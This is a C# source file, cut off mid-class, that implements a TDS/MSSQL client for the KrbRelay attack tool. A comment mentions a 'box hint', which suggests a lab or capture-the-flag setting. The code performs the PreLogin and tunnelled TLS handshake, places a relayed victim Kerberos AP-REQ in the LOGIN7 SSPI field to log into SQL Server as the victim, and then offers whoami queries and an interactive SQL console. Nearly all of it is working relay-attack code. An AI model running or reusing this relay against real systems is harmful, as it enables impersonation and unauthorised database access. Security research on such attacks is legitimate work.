using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;
using static KrbRelay.Program;

namespace KrbRelay.Clients
{
    // ---------------------------------------------------------------------
    // TDS / MSSQL relay client for KrbRelay.
    //
    // Mirrors the SMBLibrary SMB2Client usage pattern that KrbRelay already
    // relies on:
    //
    //   * Program.Main() calls tdsClient.Connect(host, port) once, up front,
    //     to open the TCP socket, run the TDS PreLogin handshake and (if the
    //     server asks for it) the TLS-in-TDS handshake. None of that needs
    //     the relayed Kerberos ticket, so it happens before the COM trigger.
    //
    //   * The hooked AcceptSecurityContext_kerb() grabs the victim AP-REQ into
    //     Program.ticket and calls Mssql.Connect(), which calls
    //     tdsClient.Login(ticket, out success). That builds the TDS LOGIN7
    //     packet, drops the AP-REQ into the SSPI field, sends it and parses the
    //     response token stream.
    //
    // The "multi-step protocol" the box hint refers to is exactly this TDS
    // sequence: PRELOGIN -> (TLS handshake tunnelled inside TDS 0x12 packets)
    // -> LOGIN7-with-SSPI. A naive relay that just throws the AP-REQ at 1433
    // gets rejected because SQL Server requires the login packet to be wrapped
    // in TLS that is itself tunnelled inside TDS framing.
    // ---------------------------------------------------------------------

    public class TdsClient
    {
        // TDS packet types
        private const byte TDS_SQL_BATCH = 0x01;
        private const byte TDS_LOGIN7 = 0x10;
        private const byte TDS_SSPI = 0x11;     // follow-up SSPI token (mutual-auth continuation)
        private const byte TDS_PRELOGIN = 0x12;

        // TDS packet status flags
        private const byte STATUS_NORMAL = 0x00;
        private const byte STATUS_EOM = 0x01;

        // PreLogin option tokens
        private const byte PL_VERSION = 0x00;
        private const byte PL_ENCRYPTION = 0x01;
        private const byte PL_INSTOPT = 0x02;
        private const byte PL_THREADID = 0x03;
        private const byte PL_MARS = 0x04;
        private const byte PL_TERMINATOR = 0xFF;

        // Encryption negotiation values
        private const byte ENCRYPT_OFF = 0x00;
        private const byte ENCRYPT_ON = 0x01;
        private const byte ENCRYPT_NOT_SUP = 0x02;
        private const byte ENCRYPT_REQ = 0x03;

        // TDS response token types
        private const byte TOKEN_ERROR = 0xAA;
        private const byte TOKEN_INFO = 0xAB;
        private const byte TOKEN_LOGINACK = 0xAD;
        private const byte TOKEN_ENVCHANGE = 0xE3;
        private const byte TOKEN_SSPI = 0xED;
        private const byte TOKEN_COLMETADATA = 0x81;
        private const byte TOKEN_ROW = 0xD1;
        private const byte TOKEN_NBCROW = 0xD2;
        private const byte TOKEN_DONE = 0xFD;
        private const byte TOKEN_DONEPROC = 0xFE;
        private const byte TOKEN_DONEINPROC = 0xFF;
        private const byte TOKEN_ORDER = 0xA9;
        private const byte TOKEN_RETURNSTATUS = 0x79;
        private const byte TOKEN_FEATUREEXTACK = 0xAE;

        private const int PACKET_SIZE = 4096;

        private TcpClient _tcp;
        private Stream _raw;          // underlying NetworkStream
        private TdsHandshakeStream _tunnel; // wraps TLS handshake in TDS packets
        private Stream _transport;    // what SendTDS/ReadTDS talk over (raw or SslStream)
        private byte _packetId = 0;
        private string _host;
        private bool _encryptOff = false; // ENCRYPT_OFF => plaintext after the login packet
        private bool _loginSent = false;  // first leg = LOGIN7, later legs = TDS_SSPI

        // Set true (or export KRBRELAY_TDS_DEBUG) to dump TDS packets on the wire.
        public static bool Verbose =
            !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("KRBRELAY_TDS_DEBUG"));

        // Read timeout in milliseconds; a silent server then fails loudly
        // instead of hanging forever inside the SSPI hook.
        public static int ReadTimeoutMs = 30000;

        public bool Connected { get; private set; }

        private static void Dbg(string fmt, params object[] a)
        {
            if (Verbose) Console.WriteLine("[dbg] " + string.Format(fmt, a));
        }

        // --- connection + PreLogin + optional TLS --------------------------
        public bool Connect(string host, int port)
        {
            _host = host;
            try
            {
                _tcp = new TcpClient();
                _tcp.Connect(host, port);
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] TDS: could not connect to {0}:{1} ({2})", host, port, e.Message);
                return false;
            }

            _tcp.ReceiveTimeout = ReadTimeoutMs;
            _raw = _tcp.GetStream();
            _transport = _raw;

            byte serverEncryption = PreLogin();
            Console.WriteLine("[*] TDS: server encryption option = 0x{0:X2}", serverEncryption);
            _encryptOff = (serverEncryption == ENCRYPT_OFF);

            // SQL Server requires the LOGIN7 packet to be encrypted unless it
            // explicitly advertises ENCRYPT_NOT_SUP. For OFF/ON/REQ we must run
            // the TLS handshake tunnelled inside TDS 0x12 packets first.
            if (serverEncryption != ENCRYPT_NOT_SUP)
            {
                try
                {
                    _tunnel = new TdsHandshakeStream(_raw);
                    var ssl = new SslStream(_tunnel, false, (s, cert, chain, errs) => true);
                    // SQL Server presents a self-signed cert for login encryption.
                    ssl.AuthenticateAsClient(_host);
                    _tunnel.HandshakeDone = true;   // subsequent IO is raw ciphertext passthrough
                    _transport = ssl;
                    Console.WriteLine("[*] TDS: TLS handshake complete (tunnelled in TDS), cipher relayed over SSPI");
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] TDS: TLS handshake failed: {0}", e.Message);
                    return false;
                }
            }

            Connected = true;
            return true;
        }

        // --- LOGIN7 with the relayed Kerberos AP-REQ in the SSPI field ------
        // Returns the server's SSPI token (AP-REP for mutual auth) if present,
        // and sets success=true when a LOGINACK is seen (session established).
        public byte[] Login(byte[] sspiToken, out bool success)
        {
            success = false;

            if (!_loginSent)
            {
                // First leg: the relayed Kerberos AP-REQ rides in the LOGIN7
                // SSPI field. This is the only leg for single-round Kerberos.
                byte[] login = BuildLogin7(sspiToken);
                Console.WriteLine("[*] TDS: sending LOGIN7 ({0} byte record, {1}-byte SSPI token)",
                    login.Length, sspiToken.Length);
                SendTDS(TDS_LOGIN7, login);
                _loginSent = true;

                // ENCRYPT_OFF: encryption covers the LOGIN7 packet ONLY. We sent
                // it over TLS above; the server now replies in PLAINTEXT and all
                // subsequent traffic is plaintext. Drop back to the raw socket
                // BEFORE reading the response - otherwise SslStream blocks forever
                // framing plaintext bytes as a TLS record (the observed hang).
                // Matches impacket: `if resp['Encryption']==TDS_ENCRYPT_OFF: tlsSocket=None`
                // set after sendTDS(LOGIN7) and before recvTDS(). REQ/ON stay TLS.
                if (_encryptOff && _transport is SslStream)
                {
                    Dbg("ENCRYPT_OFF -> reverting to plaintext before reading login response");
                    _transport = _raw;
                }
            }
            else
            {
                // Later leg (mutual-auth continuation): the follow-up token goes
                // in its own TDS_SSPI (type 17) packet, NOT another LOGIN7 - this
                // is what impacket's sendAuth() does.
                Console.WriteLine("[*] TDS: sending follow-up SSPI token ({0} bytes)", sspiToken.Length);
                SendTDS(TDS_SSPI, sspiToken);
            }

            Console.WriteLine("[*] TDS: waiting for login response...");
            byte[] response;
            try
            {
                response = ReadTDS();
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] TDS: no login response ({0}). " +
                    "The relayed ticket's SPN likely doesn't match this instance, " +
                    "or encryption was mis-negotiated.", e.Message);
                return new byte[0];
            }

            byte[] serverSspi = new byte[0];
            ParseTokenStream(response, ref success, ref serverSspi, printRows: false);
            return serverSspi;
        }

        // First value of the first returned row (set during the last Query()).
        public string LastScalar = null;

        // --- run a SQL batch and print the result token stream --------------
        public void Query(string sql)
        {
            Query(sql, true);
        }

        public void Query(string sql, bool print)
        {
            LastScalar = null;
            // A SQL_BATCH in TDS 7.2+ MUST be prefixed with the ALL_HEADERS
            // stream (a Transaction Descriptor header), or SQL Server rejects it
            // with error 4009 "TDS headers contained errors". LOGIN7 does not use
            // this, which is why login worked but queries failed.
            byte[] text = Encoding.Unicode.GetBytes(sql);
            byte[] hdr = BuildAllHeaders();
            byte[] payload = new byte[hdr.Length + text.Length];
            Buffer.BlockCopy(hdr, 0, payload, 0, hdr.Length);
            Buffer.BlockCopy(text, 0, payload, hdr.Length, text.Length);
            SendTDS(TDS_SQL_BATCH, payload);
            byte[] response = ReadTDS();
            bool dummy = false;
            byte[] dummySspi = new byte[0];
            ParseTokenStream(response, ref dummy, ref dummySspi, printRows: print);
        }

        // MS-TDS 2.2.5.3 ALL_HEADERS: TotalLength + one Transaction Descriptor
        // header (type 0x0002, txn descriptor = 0, outstanding requests = 1).
        private static byte[] BuildAllHeaders()
        {
            return new byte[]
            {
                0x16, 0x00, 0x00, 0x00, // ALL_HEADERS TotalLength = 22 (incl. itself)
                0x12, 0x00, 0x00, 0x00, // HeaderLength = 18
                0x02, 0x00,             // HeaderType = 0x0002 (transaction descriptor)
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // TransactionDescriptor = 0
                0x01, 0x00, 0x00, 0x00  // OutstandingRequestCount = 1
            };
        }

        // Return the login name SQL Server sees for this session (SUSER_SNAME()).
        public string WhoAmI()
        {
            try { Query("SELECT SUSER_SNAME();", false); } catch { return null; }
            return LastScalar;
        }

        // Return the string SID (S-1-5-21-...) SQL Server sees for this session.
        public string WhoAmISid()
        {
            try { Query("SELECT master.sys.fn_varbintohexstr(SUSER_SID());", false); }
            catch { return null; }
            string hex = LastScalar;
            if (string.IsNullOrEmpty(hex)) return null;
            if (hex.StartsWith("0x") || hex.StartsWith("0X")) hex = hex.Substring(2);
            try
            {
                byte[] sid = new byte[hex.Length / 2];
                for (int k = 0; k < sid.Length; k++)
                    sid[k] = Convert.ToByte(hex.Substring(k * 2, 2), 16);
                return new System.Security.Principal.SecurityIdentifier(sid, 0).Value;
            }
            catch { return null; }
        }

        // --- interactive SQL console --------------------------------------
        // Each input line is run as its own batch. "exit"/"quit" leaves the
        // loop; a line of "GO" is ignored (accepted for muscle-memory). Blank
        // lines are skipped.
        public void Console_()
        {
            Console.WriteLine("[*] MSSQL console. Type 'exit' or 'quit' to leave.");
            while (true)
            {
                Console.Write("SQL> ");
                string line;
                try { line = Console.ReadLine(); }
                catch { break; }
                if (line == null) break;                       // EOF (Ctrl+D)
                string trimmed = line.Trim();
                if (trimmed.Length == 0) continue;
                if (string.Equals(trimmed, "exit", StringComparison.OrdinalIgnoreCase) ||
                    string.Equals(trimmed, "quit", StringComparison.OrdinalIgnoreCase))
                    break;
                if (string.Equals(trimmed, "GO", StringComparison.OrdinalIgnoreCase))
                    continue;
                try { Query(line); }
                catch (Exception e) { Console.WriteLine("[-] {0}", e.Message); break; }
            }
        }

        public void Disconnect()
        {
            try { _transport?.Dispose(); } catch { }
            try { _tcp?.Close(); } catch { }
            Connected = false;
            _loginSent = false;
        }

        // ------------------------------------------------------------------
        // PreLogin: advertise ENCRYPT_OFF and read back the server's choice.
        // ------------------------------------------------------------------
        private byte PreLogin()
        {
            // Build option data blocks
            byte[] version = new byte[] { 0x11, 0x00, 0x00, 0x00, 0x00, 0x00 }; // ver 17.0 build 0
            byte[] encryption = new byte[] { ENCRYPT_OFF };
            byte[] instopt = new byte[] { 0x00 };
            byte[] threadid = new byte[] { 0x00, 0x00, 0x00, 0x00 };
            byte[] mars = new byte[] { 0x00 };

            var options = new List<KeyValuePair<byte, byte[]>>
            {
                new KeyValuePair<byte, byte[]>(PL_VERSION, version),
                new KeyValuePair<byte, byte[]>(PL_ENCRYPTION, encryption),
                new KeyValuePair<byte, byte[]>(PL_INSTOPT, instopt),
                new KeyValuePair<byte, byte[]>(PL_THREADID, threadid),
                new KeyValuePair<byte, byte[]>(PL_MARS, mars),
            };

            // Option table: each entry = token(1) + offset(2 BE) + length(2 BE),
            // then a single terminator token, then the data blob.
            int headerLen = options.Count * 5 + 1;
            var table = new MemoryStream();
            var data = new MemoryStream();
            int offset = headerLen;
            foreach (var opt in options)
            {
                table.WriteByte(opt.Key);
                table.WriteByte((byte)(offset >> 8));
                table.WriteByte((byte)(offset & 0xFF));
                table.WriteByte((byte)(opt.Value.Length >> 8));
                table.WriteByte((byte)(opt.Value.Length & 0xFF));
                data.Write(opt.Value, 0, opt.Value.Length);
                offset += opt.Value.Length;
            }
            table.WriteByte(PL_TERMINATOR);

            var packet = new MemoryStream();
            table.WriteTo(packet);
            data.WriteTo(packet);
            SendTDS(TDS_PRELOGIN, packet.ToArray());

            byte[] resp = ReadTDS();
            return ParsePreLoginEncryption(resp);
        }

        private byte ParsePreLoginEncryption(byte[] resp)
        {
            // Walk the option table looking for the ENCRYPTION token.
            int i = 0;
            while (i < resp.Length && resp[i] != PL_TERMINATOR)
            {
                byte token = resp[i];
                int off = (resp[i + 1] << 8) | resp[i + 2];
                int len = (resp[i + 3] << 8) | resp[i + 4];
                if (token == PL_ENCRYPTION && len >= 1 && off < resp.Length)
                    return resp[off];
                i += 5;
            }
            return ENCRYPT_NOT_SUP;
        }

        // ------------------------------------------------------------------
        // LOGIN7 record (MS-TDS 2.2.6.4). Fixed header is 94 bytes, followed
        // by the variable-length data. Integrated security -> empty user/pass,
        // fIntSecurity set in OptionFlags2, AP-REQ goes in the SSPI field.
        // ------------------------------------------------------------------
        private byte[] BuildLogin7(byte[] sspi)
        {
            string hostName = Environment.MachineName;
            string appName = "KrbRelay";
            string serverName = _host;
            string cltIntName = "KrbRelay";

            byte[] bHost = Encoding.Unicode.GetBytes(hostName);
            byte[] bApp = Encoding.Unicode.GetBytes(appName);
            byte[] bServer = Encoding.Unicode.GetBytes(serverName);
            byte[] bClt = Encoding.Unicode.GetBytes(cltIntName);

            const int FIXED = 94;
            var variable = new MemoryStream();
            var hdr = new byte[FIXED];

            int pos = FIXED;
            Func<byte[], int> append = (b) =>
            {
                int start = pos;
                variable.Write(b, 0, b.Length);
                pos += b.Length;
                return start;
            };

            // TDSVersion 7.4 (little-endian 0x74000004)
            WriteUInt32LE(hdr, 4, 0x74000004);
            WriteUInt32LE(hdr, 8, PACKET_SIZE);
            WriteUInt32LE(hdr, 12, 0x07000000);                 // ClientProgVer
            WriteUInt32LE(hdr, 16, (uint)System.Diagnostics.Process.GetCurrentProcess().Id);
            WriteUInt32LE(hdr, 20, 0);                           // ConnectionID
            hdr[24] = 0xE0;                                      // OptionFlags1: fUseDB|fInitDbFatal|fSetLangFatal (impacket default)
            // OptionFlags2: fInitLangFatal(0x01) | fODBC(0x02) | fIntSecurity(0x80)
            // 0x83 matches impacket's integrated-auth login; some servers reject 0x80 alone.
            hdr[25] = 0x83;
            hdr[26] = 0x00;                                      // TypeFlags
            hdr[27] = 0x00;                                      // OptionFlags3
            WriteUInt32LE(hdr, 28, 0);                           // ClientTimeZone
            WriteUInt32LE(hdr, 32, 0);                           // ClientLCID

            // offset/length table (characters for strings, bytes for SSPI)
            int ibHost = append(bHost);
            WriteOffLen(hdr, 36, ibHost, bHost.Length / 2);
            WriteOffLen(hdr, 40, pos, 0);                        // UserName (empty)
            WriteOffLen(hdr, 44, pos, 0);                        // Password (empty)
            int ibApp = append(bApp);
            WriteOffLen(hdr, 48, ibApp, bApp.Length / 2);
            int ibServer = append(bServer);
            WriteOffLen(hdr, 52, ibServer, bServer.Length / 2);
            WriteOffLen(hdr, 56, pos, 0);                        // Extension/Unused
            int ibClt = append(bClt);
            WriteOffLen(hdr, 60, ibClt, bClt.Length / 2);
            WriteOffLen(hdr, 64, pos, 0);                        // Language (empty)
            WriteOffLen(hdr, 68, pos, 0);                        // Database (empty)
            // ClientID (6 bytes) at offset 72 -> leave as zeros

            // SSPI
            int ibSspi = append(sspi);
            int cbSspi = sspi.Length <= 0xFFFF ? sspi.Length : 0xFFFF;
            WriteOffLen(hdr, 78, ibSspi, cbSspi);
            WriteOffLen(hdr, 82, pos, 0);                        // AtchDBFile (empty)
            WriteOffLen(hdr, 86, pos, 0);                        // ChangePassword (empty)
            // cbSSPILong at 90
            uint cbSspiLong = sspi.Length > 0xFFFF ? (uint)sspi.Length : 0;
            WriteUInt32LE(hdr, 90, cbSspiLong);

            byte[] varBytes = variable.ToArray();
            int total = FIXED + varBytes.Length;
            WriteUInt32LE(hdr, 0, (uint)total);                  // Length

            var record = new byte[total];
            Buffer.BlockCopy(hdr, 0, record, 0, FIXED);
            Buffer.BlockCopy(varBytes, 0, record, FIXED, varBytes.Length);
            return record;
        }

        // ------------------------------------------------------------------
        // Token stream parser. Handles what we care about for the relay:
        // LOGINACK (success), SSPI (mutual-auth AP-REP), ERROR/INFO messages,
        // and a best-effort COLMETADATA/ROW printer for -query output.
        // ------------------------------------------------------------------
        private void ParseTokenStream(byte[] buf, ref bool success, ref byte[] sspi, bool printRows)
        {
            int i = 0;
            List<ColumnMeta> cols = null;
            while (i < buf.Length)
            {
                byte token = buf[i++];
                switch (token)
                {
                    case TOKEN_SSPI:
                        {
                            int len = ReadUInt16LE(buf, i); i += 2;
                            sspi = buf.Skip(i).Take(len).ToArray();
                            i += len;
                            Console.WriteLine("[*] TDS: received server SSPI token ({0} bytes)", len);
                            break;
                        }
                    case TOKEN_LOGINACK:
                        {
                            int len = ReadUInt16LE(buf, i); i += 2;
                            success = true;
                            // interface(1) + tdsver(4) + progNameLen(1)*2 + ...
                            try
                            {
                                int p = i + 5;
                                int nameLen = buf[p]; p += 1;
                                string prog = Encoding.Unicode.GetString(buf, p, nameLen * 2);
                                Console.WriteLine("[+] TDS: LOGINACK - server program '{0}'", prog);
                            }
                            catch { Console.WriteLine("[+] TDS: LOGINACK received"); }
                            i += len;
                            break;
                        }
                    case TOKEN_ERROR:
                        {
                            int len = ReadUInt16LE(buf, i); i += 2;
                            PrintMessage(buf, i, "[-] MSSQL error");
                            i += len;
                            break;
                        }
                    case TOKEN_INFO:
                        {
                            int len = ReadUInt16LE(buf, i); i += 2;
                            PrintMessage(buf, i, "[*] MSSQL info");
                            i += len;
                            break;
                        }
                    case TOKEN_ENVCHANGE:
                        {
                            int len = ReadUInt16LE(buf, i); i += 2;
                            i += len;
                            break;
                        }
                    case TOKEN_FEATUREEXTACK:
                        {
                            // list of features terminated by 0xFF
                            while (i < buf.Length && buf[i] != 0xFF)
                            {
                                i += 1;                       // feature id
                                int flen = (int)ReadUInt32LE(buf, i); i += 4;
                                i += flen;
                            }
                            i += 1;                           // terminator
                            break;
                        }
                    case TOKEN_RETURNSTATUS:
                        i += 4;
                        break;
                    case TOKEN_ORDER:
                        {
                            int len = ReadUInt16LE(buf, i); i += 2;
                            i += len;
                            break;
                        }
                    case TOKEN_COLMETADATA:
                        cols = ParseColMetaData(buf, ref i);
                        break;
                    case TOKEN_ROW:
                        if (cols != null) PrintRow(buf, ref i, cols, printRows);
                        else return; // can't parse rows without metadata
                        break;
                    case TOKEN_NBCROW:
                        if (cols != null) PrintNbcRow(buf, ref i, cols, printRows);
                        else return;
                        break;
                    case TOKEN_DONE:
                    case TOKEN_DONEPROC:
                    case TOKEN_DONEINPROC:
                        // Status(2) CurCmd(2) RowCount(8) in TDS 7.2+
                        i += 12;
                        break;
                    default:
                        // Unknown token: we can't safely resync, stop here.
                        return;
                }
            }
        }

        private void PrintMessage(byte[] buf, int i, string prefix)
        {
            try
            {
                int p = i;
                uint number = ReadUInt32LE(buf, p); p += 4;
                p += 1; // state
                p += 1; // class
                int msgLen = ReadUInt16LE(buf, p); p += 2;
                string msg = Encoding.Unicode.GetString(buf, p, msgLen * 2);
                Console.WriteLine("{0} ({1}): {2}", prefix, number, msg);
            }
            catch { }
        }

        private class ColumnMeta
        {
            public string Name;
            public byte Type;
            public int FixedLen;   // for fixed-length types
            public bool IsVarChar; // char/varchar/text style
            public bool IsVarBin;
            public bool TwoByteLen;
            public bool FourByteLen;
        }

        private List<ColumnMeta> ParseColMetaData(byte[] buf, ref int i)
        {
            var cols = new List<ColumnMeta>();
            int count = ReadUInt16LE(buf, i); i += 2;
            if (count == 0xFFFF) return cols; // no metadata
            for (int c = 0; c < count; c++)
            {
                var col = new ColumnMeta();
                i += 4;                       // UserType (4)
                i += 2;                       // Flags (2)
                byte type = buf[i++]; col.Type = type;
                ClassifyType(buf, ref i, col);
                int nameLen = buf[i++];
                col.Name = Encoding.Unicode.GetString(buf, i, nameLen * 2);
                i += nameLen * 2;
                cols.Add(col);
            }
            // header line
            Console.WriteLine("| " + string.Join(" | ", cols.Select(x => x.Name)) + " |");
            return cols;
        }

        // Determine how to read a column value. Covers the common types seen in
        // SELECT output; unknown types fall back to a 2-byte length prefix.
        private void ClassifyType(byte[] buf, ref int i, ColumnMeta col)
        {
            switch (col.Type)
            {
                // fixed length
                case 0x30: col.FixedLen = 1; break;  // INT1
                case 0x34: col.FixedLen = 2; break;  // INT2
                case 0x38: col.FixedLen = 4; break;  // INT4
                case 0x7F: col.FixedLen = 8; break;  // INT8
                case 0x32: col.FixedLen = 1; break;  // BIT
                case 0x3B: col.FixedLen = 4; break;  // FLT4
                case 0x3E: col.FixedLen = 8; break;  // FLT8
                // variable, 1-byte length prefix
                case 0x26: col.FixedLen = -1; i += 1; break; // INTN  (byte: max len)
                case 0x68: col.FixedLen = -1; i += 1; break; // BITN
                case 0x6D: col.FixedLen = -1; i += 1; break; // FLTN
                case 0x6A: col.FixedLen = -1; i += 2; break; // DECIMALN (prec/scale)
                case 0x6C: col.FixedLen = -1; i += 2; break; // NUMERICN
                // char/binary big types: 2-byte max length (+ collation for char)
                case 0xA7: col.IsVarChar = true; col.TwoByteLen = true; i += 2; i += 5; break; // BIGVARCHR
                case 0xAF: col.IsVarChar = true; col.TwoByteLen = true; i += 2; i += 5; break; // BIGCHAR
                case 0xE7: col.IsVarChar = true; col.TwoByteLen = true; i += 2; i += 5; break; // NVARCHAR
                case 0xEF: col.IsVarChar = true; col.TwoByteLen = true; i += 2; i += 5; break; // NCHAR
                case 0xA5: col.IsVarBin = true; col.TwoByteLen = true; i += 2; break;          // BIGVARBIN
                case 0xAD: col.IsVarBin = true; col.TwoByteLen = true; i += 2; break;          // BIGBINARY
                // text/ntext (4-byte length, has collation + table name parts)
                case 0x23: col.IsVarChar = true; col.FourByteLen = true; i += 4; i += 5; SkipTableName(buf, ref i); break; // TEXT
                case 0x63: col.IsVarChar = true; col.FourByteLen = true; i += 4; i += 5; SkipTableName(buf, ref i); break; // NTEXT
                case 0x22: col.IsVarBin = true; col.FourByteLen = true; i += 4; SkipTableName(buf, ref i); break;          // IMAGE
                default:
                    // Best-effort: assume a 2-byte length-prefixed value.
                    col.IsVarChar = true; col.TwoByteLen = true;
                    break;
            }
        }

        private void SkipTableName(byte[] buf, ref int i)
        {
            int parts = buf[i++];
            for (int p = 0; p < parts; p++)
            {
                int len = ReadUInt16LE(buf, i); i += 2;
                i += len * 2;
            }
        }

        private void PrintRow(byte[] buf, ref int i, List<ColumnMeta> cols, bool print)
        {
            var vals = new List<string>();
            foreach (var col in cols)
                vals.Add(ReadValue(buf, ref i, col));
            if (LastScalar == null && vals.Count > 0) LastScalar = vals[0];
            if (print) Console.WriteLine("| " + string.Join(" | ", vals) + " |");
        }

        private void PrintNbcRow(byte[] buf, ref int i, List<ColumnMeta> cols, bool print)
        {
            // null bitmap: ceil(n/8) bytes
            int nbytes = (cols.Count + 7) / 8;
            byte[] bitmap = buf.Skip(i).Take(nbytes).ToArray();
            i += nbytes;
            var vals = new List<string>();
            for (int c = 0; c < cols.Count; c++)
            {
                bool isNull = (bitmap[c / 8] & (1 << (c % 8))) != 0;
                if (isNull) { vals.Add("NULL"); continue; }
                vals.Add(ReadValue(buf, ref i, cols[c]));
            }
            if (LastScalar == null && vals.Count > 0) LastScalar = vals[0];
            if (print) Console.WriteLine("| " + string.Join(" | ", vals) + " |");
        }

        private string ReadValue(byte[] buf, ref int i, ColumnMeta col)
        {
            if (col.FixedLen > 0)
            {
                byte[] b = buf.Skip(i).Take(col.FixedLen).ToArray();
                i += col.FixedLen;
                return FormatInt(b);
            }
            int len;
            if (col.FourByteLen)
            {
                // text/ntext/image: 1-byte textptr len, textptr, 8-byte timestamp, then 4-byte data len
                int tptr = buf[i++];
                if (tptr == 0) return "NULL";
                i += tptr;        // text pointer
                i += 8;           // timestamp
                len = (int)ReadUInt32LE(buf, i); i += 4;
            }
            else if (col.TwoByteLen)
            {
                len = ReadUInt16LE(buf, i); i += 2;
                if (len == 0xFFFF) return "NULL";
            }
            else
            {
                len = buf[i++];
                if (len == 0) return "NULL";
            }
            byte[] data = buf.Skip(i).Take(len).ToArray();
            i += len;
            if (col.IsVarChar)
            {
                // NVARCHAR/NCHAR/NTEXT are UTF-16, the *VARCHR/CHAR/TEXT are MBCS.
                if (col.Type == 0xE7 || col.Type == 0xEF || col.Type == 0x63)
                    return Encoding.Unicode.GetString(data);
                return Encoding.ASCII.GetString(data);
            }
            if (col.IsVarBin)
                return "0x" + BitConverter.ToString(data).Replace("-", "");
            return FormatInt(data);
        }

        private string FormatInt(byte[] b)
        {
            if (b.Length == 1) return ((sbyte)b[0]).ToString();
            if (b.Length == 2) return BitConverter.ToInt16(b, 0).ToString();
            if (b.Length == 4) return BitConverter.ToInt32(b, 0).ToString();
            if (b.Length == 8) return BitConverter.ToInt64(b, 0).ToString();
            return "0x" + BitConverter.ToString(b).Replace("-", "");
        }

        // ------------------------------------------------------------------
        // TDS packet framing. Header: Type(1) Status(1) Length(2 BE) SPID(2)
        // PacketID(1) Window(1). Payload is chunked across PACKET_SIZE frames.
        // ------------------------------------------------------------------
        private void SendTDS(byte type, byte[] payload)
        {
            int maxData = PACKET_SIZE - 8;
            int sent = 0;
            if (payload.Length == 0)
            {
                WritePacket(type, STATUS_EOM, payload, 0, 0);
                return;
            }
            while (sent < payload.Length)
            {
                int chunk = Math.Min(maxData, payload.Length - sent);
                bool last = (sent + chunk) >= payload.Length;
                WritePacket(type, last ? STATUS_EOM : STATUS_NORMAL, payload, sent, chunk);
                sent += chunk;
            }
        }

        private void WritePacket(byte type, byte status, byte[] payload, int offset, int count)
        {
            int total = count + 8;
            var pkt = new byte[total];
            pkt[0] = type;
            pkt[1] = status;
            pkt[2] = (byte)(total >> 8);     // length big-endian
            pkt[3] = (byte)(total & 0xFF);
            pkt[4] = 0; pkt[5] = 0;          // SPID
            pkt[6] = _packetId++;            // PacketID
            pkt[7] = 0;                      // Window
            Buffer.BlockCopy(payload, offset, pkt, 8, count);
            Dbg("send type=0x{0:X2} status=0x{1:X2} len={2}", type, status, total);
            _transport.Write(pkt, 0, total);
            _transport.Flush();
        }

        // Read a full TDS message (concatenate packets until EOM) -> payload.
        private byte[] ReadTDS()
        {
            var ms = new MemoryStream();
            while (true)
            {
                byte[] header = ReadFully(_transport, 8);
                byte status = header[1];
                int length = (header[2] << 8) | header[3];
                int dataLen = length - 8;
                Dbg("recv type=0x{0:X2} status=0x{1:X2} len={2}", header[0], status, length);
                if (dataLen < 0) throw new IOException("TDS: bad packet length " + length);
                if (dataLen > 0)
                {
                    byte[] data = ReadFully(_transport, dataLen);
                    ms.Write(data, 0, data.Length);
                }
                if ((status & STATUS_EOM) != 0) break;
            }
            return ms.ToArray();
        }

        // --- small helpers -------------------------------------------------
        internal static byte[] ReadFully(Stream s, int n)
        {
            var buf = new byte[n];
            int read = 0;
            while (read < n)
            {
                int r = s.Read(buf, read, n - read);
                if (r <= 0) throw new IOException("TDS: connection closed by server");
                read += r;
            }
            return buf;
        }

        private static void WriteUInt32LE(byte[] b, int off, uint v)
        {
            b[off] = (byte)(v & 0xFF);
            b[off + 1] = (byte)((v >> 8) & 0xFF);
            b[off + 2] = (byte)((v >> 16) & 0xFF);
            b[off + 3] = (byte)((v >> 24) & 0xFF);
        }

        private static void WriteOffLen(byte[] b, int off, int ibValue, int cchValue)
        {
            b[off] = (byte)(ibValue & 0xFF);
            b[off + 1] = (byte)((ibValue >> 8) & 0xFF);
            b[off + 2] = (byte)(cchValue & 0xFF);
            b[off + 3] = (byte)((cchValue >> 8) & 0xFF);
        }

        private static int ReadUInt16LE(byte[] b, int off)
        {
            return b[off] | (b[off + 1] << 8);
        }

        private static uint ReadUInt32LE(byte[] b, int off)
        {
            return (uint)(b[off] | (b[off + 1] << 8) | (b[off + 2] << 16) | (b[off + 3] << 24));
        }
    }

    // ----------------------------------------------------------------------
    // Stream that tunnels the TLS handshake inside TDS PRELOGIN (0x12) packets.
    //
    // While HandshakeDone == false, each Write from SslStream (a TLS handshake
    // flight) is wrapped in one TDS 0x12 packet, and each Read returns the
    // payload of one TDS 0x12 packet from the server. Once the handshake is
    // done we flip to raw passthrough: SslStream then writes/reads ciphertext
    // directly, and the LOGIN7 TDS packet rides inside that TLS record just as
    // SQL Server expects.
    // ----------------------------------------------------------------------
    internal class TdsHandshakeStream : Stream
    {
        private readonly Stream _inner;
        private byte[] _leftover = new byte[0];
        private int _leftoverPos = 0;
        public bool HandshakeDone = false;

        public TdsHandshakeStream(Stream inner) { _inner = inner; }

        public override void Write(byte[] buffer, int offset, int count)
        {
            if (HandshakeDone)
            {
                _inner.Write(buffer, offset, count);
                return;
            }
            int total = count + 8;
            var pkt = new byte[total];
            pkt[0] = 0x12;                 // PRELOGIN
            pkt[1] = 0x01;                 // EOM
            pkt[2] = (byte)(total >> 8);
            pkt[3] = (byte)(total & 0xFF);
            pkt[4] = 0; pkt[5] = 0;
            pkt[6] = 0; pkt[7] = 0;
            Buffer.BlockCopy(buffer, offset, pkt, 8, count);
            _inner.Write(pkt, 0, total);
            _inner.Flush();
        }

        public override int Read(byte[] buffer, int offset, int count)
        {
            if (HandshakeDone)
                return _inner.Read(buffer, offset, count);

            if (_leftoverPos >= _leftover.Length)
            {
                // read one TDS packet and expose its payload
                byte[] header = TdsClient.ReadFully(_inner, 8);
                int length = (header[2] << 8) | header[3];
                int dataLen = length - 8;
                _leftover = dataLen > 0 ? TdsClient.ReadFully(_inner, dataLen) : new byte[0];
                _leftoverPos = 0;
            }
            int avail = _leftover.Length - _leftoverPos;
            int n = Math.Min(count, avail);
            Buffer.BlockCopy(_leftover, _leftoverPos, buffer, offset, n);
            _leftoverPos += n;
            return n;
        }

        public override void Flush() { _inner.Flush(); }
        public override bool CanRead => true;
        public override bool CanWrite => true;
        public override bool CanSeek => false;
        public override long Length => throw new NotSupportedException();
